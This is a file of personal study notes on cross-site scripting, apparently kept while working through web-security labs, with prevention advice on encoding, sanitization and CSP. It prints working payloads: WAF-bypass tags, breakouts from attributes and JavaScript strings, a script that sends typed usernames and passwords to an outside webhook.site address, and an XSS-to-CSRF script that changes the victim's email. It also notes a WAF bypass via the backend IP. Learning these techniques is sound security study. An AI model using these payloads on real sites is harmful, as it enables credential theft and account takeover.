@@ -1,0 +1,222 @@
+XSS
+
+- This is a JS injection technique, a JS inside a website can do a lot of things like manipulate DOM, Cookies, etc. so if we are able to inject some js then its a win.
+
+- Just a JS injection. if user input directly go into html then
+
+You basically use <script> alert(299) </script> into the input inorder to test if XSS is present, or event haddler like onerror, onclick
+
+XSS payloads:
+- <script> alert(299) </alert>
+- "><svg onload=alert(1)> -- this only works in document.write not in jquery, same vo prepared statements wala scene lag rha hai
+onclick
+- insert img tag with onerror event
+
+Types:
+1) Reflected - just Reflected to the victen Browser
+2) Stored - stored into the DB - for example into comments, whoever sees the comments gets infected automatically
+3) DOM based
+4) Mutation based
+
+Solutions: DOM purify (sanitization basically is the solution to most of these)
+
+Most famous example of Stored XSS is Samy kamkar myspace hack - took down the entire myspace
+
+Learning from the labs:
+1) have to find how DOM is being manipulated, how can you inject js (maybe this only works for client)
+2) you can't manipulate html using " in jquery but you can when the site is using document.write()  
+3) https://chatgpt.com/share/10101632-32f8-4393-9ade-5d6fa1e4d00b
+4) jQuery is used to manipuate DOM basically, starts with $() always
+
+
+Types:
+1) DOM based - This happens when there is some JS logic client side and it works on the input provided by the user: source and sink 
+https://medium.com/@fath3ad.22/understanding-dom-based-xss-sources-and-sinks-c17ae4bc7455 
+Mostly done when there is a lot of client-side scripts
+Look for different sources in the medium blog
+Known as DOM based because this is executed as a result of modifying the DOM environment
+Third parties: jQuery (this is entirely client side and only has scripts that are executed client side based on inputs or some change in the DOM)
+Source is mostly the URL and sink is mostly the part where that payload is written by the client side script
+In DOM Based attacks look for scripts written in the src, usually they contain some JS based XSS context
+
+2) Reflected - Here the HTML comes from the backend, therefore it renders totally on the Browser so you can use " (double quotes) to escape a html tag attribute and write new ones
+like onclick, onmousemove, onerror. The only thing that matters is ki saath me render honge ki prepared statements ke jaise
+
+An external delivery mechanism is always required inorder to do the Reflected XSS attack, therefore CoRs protection could also save most of these. So, Stored XSS is more severe
+Burp web vulnerability scanner is very effective and reliable for detecting XSS.
+
+Whenever payload goes inside href in anchor tag use javascript:alert(1)
+
+Steps:
+- Identify stored or Reflected, stored are better always
+- Breaking Out of Attributes: If you're able to close the attribute value and add new attributes or elements, you can execute JavaScript.
+- Example: whenever href go for javascript:alert()
+- %20=1 can be used inorder to check for attributes %20 represents space, whole payload could be <body%20§§=1> in Burp Intruder 
+
+Above are wrong:
+1) Enter any unique text in the inputs and ctrl + F to find out all the places where the payload are Reflected, identify the XSS context and accordingly
+write a payload.
+2) Burp Intruder can be used to indentify what all things are validated or not. by chosing payload from the Port swigger XSS_Filter_Evasion_Cheat_Sheet
+
+
+
+Preventions: 
+1) sanitization
+2) validation
+3) Encoding
+4) CSP
+
+XSS payloads:
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+https://github.com/ihebski/XSS-Payloads
+
+Myth busters:
+1) There is no prepared system type of logic present in HTML (I think), what you were thinking is achieved using HTML or URL encoding.
+So, everytime there is a HTML encoded version the Browser automatically decodes it. Agar HTML encode nahi hota toh Browser would have rendered that HTML tags.
+
+Labs discussions:
+
+1) XSS againt WAF when most tags are banned: Solution to this is find a place that could be vulnerable to XSS and which doesn't allow html tags, therefore use Burp Intruder to hit and try 
+                                             all the tags, the use the Burp Intruder again to check all the attributes 
+
+                                             for example <body> was allowed and onresize attribute was also allowed.
+                                             therefore, <body onresize=print()>
+
+                                             Not attribute but eventHandlers are allowed to have JS in them.
+
+2) XSS againt WAF when all tags are banned execpt the custom tags: solution: <xss autofocus tabindex=1 onfocus=alert(1)></xss>
+                                            I tried all kind of attacks with custom tags:
+                                            Learning: custom tags are like <custom-tag > something </custom-tag>
+                                            You can have all the attributes like onclick, onload, etc in it.
+                                            Then deliver the attack to the other person.
+
+3) XSS againt WAF when all tags except SVG are not allowed: Do the same thing look for tags that are allowed using Burp Intruder and then move forward with attributes that are allowed after 
+                                            getting the html tag.
+                                            <svg><animatetransform onbegin="alert(2)"> --> Solution for this one/
+
+In all the XSS attacks start with <script> alert(399) </script> and look if the website has WAF or not and what kind of sanitization it has.
+
+
+XSS context: XSS attack depends on the context where the the payload appears and how it is validated or sanitize.
+1) XSS between HTML tags:
+    <script>alert(document.domain)</script>
+
+<img src=1 onerror=alert(1)>
+
+2) XSS in HTML tag attributes - you want to exit out of the attribute and then the tag or you can also create new attribute or use the same attribute to write the 
+                                scriptable context.
+"><script>alert(document.domain)</script>
+<a href="javascript:alert(document.domain)">
+" autofocus onfocus=alert(document.domain) x="
+
+3) XSS in XSS into JavaScript
+Terminating the existing script: </script><img src=1 onerror=alert(document.domain)>
+Breaking out of a JavaScript string: '-alert(document.domain)-'
+                                     ';alert(document.domain)//
+
+                                     Validation: might use \ to escape the ' (same as JS escaping inside strings)
+                                     Workaround: we could use  \ to escape the \, example: \';alert(document.domain)// (confuses JS)
+
+                                     // -> could use to comment out the left characters after breaking out of the strings.
+                                     Payloads: ayush\'; alert(29)//
+
+                                     Note: Mostly quotes are escaped in this therefore we can use \ to double escape it.
+
+
+4) XSS to get Cookies, Password (using password manager autofill): all of these has to be stored XSS otherwise
+                                                                    if it is Reflected than we have to have some sharing mechanism
+                                                                    to share the payload like iframe or script in your website and it is 
+                                                                    also prone to CoRs configuration.
+
+                            Payload:
+
+                            <input name=username id=username>
+                            <input type=password name=password onchange="if(this.value.length)fetch('https://webhook.site/2dc33b20-6fce-41b7-a43c-13676b6a14ad',{
+                            method:'POST',
+                            mode: 'no-cors',
+                            body:username.value+':'+this.value
+                            });">
+
+
+
+Note: Maybe I can always mitigate the backtick escape by placing many \
+\\\'
+
+ \\ \'
+
+5) XSS to perform CSRF: Anything that a legitimate user can do on a web site you can do it as well.
+                        Can put the JS on the website and make the user perform unwanted tasks, exactly like CSRF.
+                        
+                        Payload:
+                        <script>
+                        var req = new XMLHttpRequest();
+                        req.onload = handleResponse;
+                        req.open('get','/my-account',true);
+                        req.send();
+                        function handleResponse() {
+                            var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+                            var changeReq = new XMLHttpRequest();
+                            changeReq.open('post', '/my-account/change-email', true);
+                            changeReq.send('csrf='+token+'&email=test@test.com')
+                        };
+                        </script>
+
+4) XSS in JS using Template strings: you could use ${alert(document.domain)}
+                                    to escape the Template --> Read more about it.
+
+5) XSS via client-side template injection --> Have to read about it
+
+
+Preventions against XSS:
+
+1) Encoding before the Output: so that the browser doesn't execute the potential HTML or JS code.
+2) Validation after the Input: Whitelisting, blacklisting
+3) Sanitization: Refore stuff that is not potentially harmful example, bad JS containing HTML tags, use DOMPurify to tackle this.
+4) Use template engines like React, which automatically escapes or HTML encode dynamic content before giving it the browser for rendering.
+   Example:
+        
+        import React from 'react';
+
+        function UserProfile({ user }) {
+        return (
+            <div>
+            <h1>{user.name}</h1>
+            <p>{user.bio}</p>
+            </div>
+        );
+        }
+
+        user.name is automatically encoded before rendering the div.
+
+5) Mitigating XSS using content security policy (CSP) 
+
+CSP will blocks all Inline Scripts, and only allow external scripts to execute if they meet the policy regarding self or none.
+
+Inline script means the one that are written in the HTML only not in some src file. These are mostly used for XSS and CSP allows you to ban this as well.
+Can prevent script-src, object-src, frame (iframe, frame, object)
+
+Options: 'self' and 'none'
+            self -> only allows scripts or things from the same origin.
+            none -> no resources are allowed to load
+
+You can also define domains from where the scripts can be loaded, make sure it is mostly your domain because the attacker can take over that domain using XSS and exploit yours.
+
+Also, you can use nonce based and hash based policy in your CSP to protect these.
+
+Examples:
+script-src: Controls the sources from which scripts can be loaded.
+unsafe-inline: Allows inline scripts. Avoiding this keyword helps block inline scripts.
+Nonces and Hashes: Allow specific inline scripts by using nonces or hashes.
+
+Remarks:
+- Browser doesn't HTML decode everything (it doesn't decode when the text is inside input tag but it does when it is inside a div) - input, textarea are not decoded while div are decoded
+- When it is HTML directly then browser will decode it but if you are using innerhtml than you will have to decode it manually.
+- sources are entry points and sinks are exit points
+
+Note:
+If I can somehow get the IP address of the backend than I can bypass the WAF
+Question:
+How does Cloudflare hides the Backend IP address
+
+Good bypass: https://dutt786.medium.com/how-i-was-able-to-bypass-cloudflare-waf-3b30700f6c7a
